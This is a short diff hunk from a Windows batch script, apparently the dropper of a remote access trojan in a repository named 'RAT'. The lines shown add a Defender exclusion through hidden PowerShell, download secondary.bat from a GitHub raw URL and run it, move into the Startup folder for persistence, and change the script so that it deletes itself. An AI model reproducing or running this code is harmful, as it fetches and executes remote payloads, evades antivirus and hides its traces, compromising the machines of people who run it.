@@ -29,4 +29,4 @@ powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$
 curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
 cmd /c secondary.bat
 cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-del Starter.bat
+del "%~f0"
